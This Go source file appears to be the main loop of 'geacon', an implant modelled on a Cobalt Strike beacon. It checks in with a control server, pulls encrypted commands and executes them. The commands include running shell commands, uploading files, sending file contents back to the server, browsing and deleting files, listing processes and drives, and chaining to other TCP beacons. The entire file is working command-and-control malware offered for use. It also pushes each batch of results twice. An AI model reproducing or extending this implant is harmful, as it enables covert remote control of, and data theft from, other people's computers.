package main

import (
	"bytes"
	"fmt"
	"geacon/cmd/config"
	"geacon/cmd/crypt"
	"geacon/cmd/packet"
	"geacon/cmd/util"
	"io"
	"os"
	"strings"
	"time"
)

func main() {

	ok := packet.FirstBlood()
	if ok {
		for {
			resultBuf := make([]byte, 0, 100000) // holds all beacon output, should be the maximum length of a HTTP body
			chainedResults := packet.CheckTcpBeacons()
			fmt.Printf("\n\nLENGTH OF RESULTS IS: %d\n\n", len(resultBuf))
			resp := packet.PullCommand()
			fmt.Printf("%x\n", resp.Bytes())
			fmt.Printf("%d \n", resp.Response().ContentLength)
			if resp != nil {
				totalLen := len(resp.Bytes())
				if totalLen > 0 {
					

					decrypted, hmacVerfied := packet.DecryptPacket(resp.Bytes())

					if decrypted != nil {
						if hmacVerfied {
							timestamp := decrypted[:4]
							fmt.Printf("timestamp: %v\n", timestamp)
							lenBytes := decrypted[4:] // was [4:8]
							packetLen := packet.ReadInt(lenBytes)
							fmt.Printf("Packet length: %d\n", packetLen)

							decryptedBuf := bytes.NewBuffer(decrypted[8:])
							for {
								if packetLen <= 0 {
									break
								}
								cmdType, cmdBuf := packet.ParsePacket(decryptedBuf, &packetLen)
								if cmdBuf != nil {
									fmt.Printf("cmdType is %d\n", cmdType)
									fmt.Printf("%x\n", cmdBuf)
									switch cmdType {
									//shell
									case packet.CMD_TYPE_SHELL:
										shellPath, shellBuf := packet.ParseCommandShell(cmdBuf)
										result := packet.Shell(shellPath, shellBuf)
										finalPacket := packet.MakePacket(0, result)
										// packet.PushResult(finalPacket)
										resultBuf = append(resultBuf, finalPacket...)

									case packet.CMD_TYPE_UPLOAD_START:
										filePath, fileData := packet.ParseCommandUpload(cmdBuf)
										filePathStr := strings.ReplaceAll(string(filePath), "\\", "/")
										packet.Upload(filePathStr, fileData)

									case packet.CMD_TYPE_UPLOAD_LOOP:
										filePath, fileData := packet.ParseCommandUpload(cmdBuf)
										filePathStr := strings.ReplaceAll(string(filePath), "\\", "/")
										packet.Upload(filePathStr, fileData)

									case packet.CMD_TYPE_DOWNLOAD:
										filePath := cmdBuf
										//TODO encode
										strFilePath := string(filePath)
										strFilePath = strings.ReplaceAll(strFilePath, "\\", "/")
										fileInfo, err := os.Stat(strFilePath)
										if err != nil {
											//TODO notify error to c2
											//packet.processError(err.Error())
											break
										}
										fileLen := fileInfo.Size()
										test := int(fileLen)
										fileLenBytes := packet.WriteInt(test)
										requestID := crypt.RandomInt(10000, 99999)
										requestIDBytes := packet.WriteInt(requestID)
										result := util.BytesCombine(requestIDBytes, fileLenBytes, filePath)
										finalPacket := packet.MakePacket(packet.BEACON_RSP_DOWNLOAD_START, result)
										// packet.PushResult(finalPacket)
										resultBuf = append(resultBuf, finalPacket...)

										fileHandle, err := os.Open(strFilePath)
										if err != nil {
											//packet.processErrorTest(err.Error())
											break
										}
										var fileContent []byte
										fileBuf := make([]byte, 512*1024)
										for {
											n, err := fileHandle.Read(fileBuf)
											if err != nil && err != io.EOF {
												break
											}
											if n == 0 {
												break
											}
											fileContent = fileBuf[:n]
											result = util.BytesCombine(requestIDBytes, fileContent)
											finalPacket = packet.MakePacket(packet.BEACON_RSP_DOWNLOAD_WRITE, result)
											// packet.PushResult(finalPacket)
											resultBuf = append(resultBuf, finalPacket...)
										}

										finalPacket = packet.MakePacket(packet.BEACON_RSP_DOWNLOAD_COMPLETE, requestIDBytes)
										// packet.PushResult(finalPacket)
										resultBuf = append(resultBuf, finalPacket...)
									case packet.CMD_TYPE_FILE_BROWSE:
										dirResult := packet.File_Browse(cmdBuf)
										finalPacket := packet.MakePacket(packet.BEACON_RSP_FILE_BROWSE_RESULT, dirResult)
										// packet.PushResult(finalPacket)
										resultBuf = append(resultBuf, finalPacket...)
									case packet.CMD_TYPE_CD:
										packet.ChangeCurrentDir(cmdBuf)
									case packet.CMD_TYPE_RM:
										packet.RemoveFile(cmdBuf)
									case packet.CMD_TYPE_DRIVES:
										driveResult := packet.ListDrives()
										finalPacket := packet.MakePacket(packet.BEACON_RSP_OUTPUT, driveResult)
										// packet.PushResult(finalPacket)
										resultBuf = append(resultBuf, finalPacket...)
									case packet.CMD_TYPE_GETUID:
										getuidResult := packet.GetUid()
										finalPacket := packet.MakePacket(packet.BEACON_RSP_BEACON_GETUID, getuidResult)
										// packet.PushResult(finalPacket)
										resultBuf = append(resultBuf, finalPacket...)
									case packet.CMD_TYPE_CP:
										// fmt.Printf("%x\n", cmdBuf)
										fromPath, toPath := packet.ParseCommandCopyMove(cmdBuf)
										packet.CopyFile(fromPath, toPath)
									case packet.CMD_TYPE_MV:
										fromPath, toPath := packet.ParseCommandCopyMove(cmdBuf)
										packet.MoveFile(fromPath, toPath)
									case packet.CMD_TYPE_SLEEP:
										sleep := packet.ReadInt(cmdBuf[:4])
										//jitter := packet.ReadInt(cmdBuf[4:8])
										fmt.Printf("Now sleep is %d ms\n",sleep)
										config.WaitTime = time.Duration(sleep) * time.Millisecond
									case packet.CMD_TYPE_PWD:
										pwdResult := packet.GetCurrentDirectory()
										finalPacket := packet.MakePacket(packet.BEACON_RSP_BEACON_GETCWD, pwdResult) // 32
										// packet.PushResult(finalPacket)
										resultBuf = append(resultBuf, finalPacket...)
									case packet.CMD_TYPE_LIST_PROCESS:
										processList := packet.ListProcesses()
										finalPacket := packet.MakePacket(packet.BEACON_RSP_BEACON_OUTPUT_PS, processList)
										// packet.PushResult(finalPacket)
										resultBuf = append(resultBuf, finalPacket...)
									case packet.CMD_TYPE_CONNECT:
										target, port := packet.ParseCommandConnect(cmdBuf)
										fmt.Printf("Attempting to connect to TCP beacon on %s:%d\n", target, port)
										beaconId, encryptedMetaData := packet.ConnectTcpBeacon(target, port)
										result := util.BytesCombine(packet.WriteInt(0), packet.WriteInt(beaconId), encryptedMetaData)
										finalPacket := packet.MakePacket(packet.BEACON_RSP_BEACON_LINK, result)
										// packet.PushResult(finalPacket)
										resultBuf = append(resultBuf, finalPacket...)
									case packet.CMD_TYPE_EXIT:
										os.Exit(0)
									default:

										errIdBytes := packet.WriteInt(0) // must be zero
										arg1Bytes := packet.WriteInt(0)  // for debug
										arg2Bytes := packet.WriteInt(0)
										errMsgBytes := []byte("The feature you are trying to use is not implemented yet.")
										result := util.BytesCombine(errIdBytes, arg1Bytes, arg2Bytes, errMsgBytes)
										finalPacket := packet.MakePacket(31, result)
										// packet.PushResult(finalPacket)
										resultBuf = append(resultBuf, finalPacket...)

									}
								} else {
									fmt.Printf("cmdBuf is empty!")
								}
							}
							if len(resultBuf) > 0 {
								resultBuf = append(resultBuf, chainedResults...)
								// send a consolidated output
								packet.PushResult(packet.EncryptPacket(resultBuf))

								fmt.Printf("\n\nLENGTH OF RESULTS IS: %d\n\n", len(resultBuf))

								fmt.Printf("Sending the following data:\n%x\n\n", resultBuf)

								packet.PushResult(packet.EncryptPacket(resultBuf))
							}
						} else {
							fmt.Printf("HMAC could not be verified. Ignoring command.\n\n")
						}
					} else {
						if len(chainedResults) > 0 {
							resultBuf = append(resultBuf, chainedResults...)
							packet.PushResult(packet.EncryptPacket(resultBuf))

						} else {
							fmt.Printf("Beacon checked in!\n\n")
						}
					}
				}
			}
			// fmt.Printf("Cycle done, sleeping for %d seconds!\n\n\n", (config.WaitTime / time.Millisecond / 1000))
			time.Sleep(config.WaitTime)
		}
	}

}
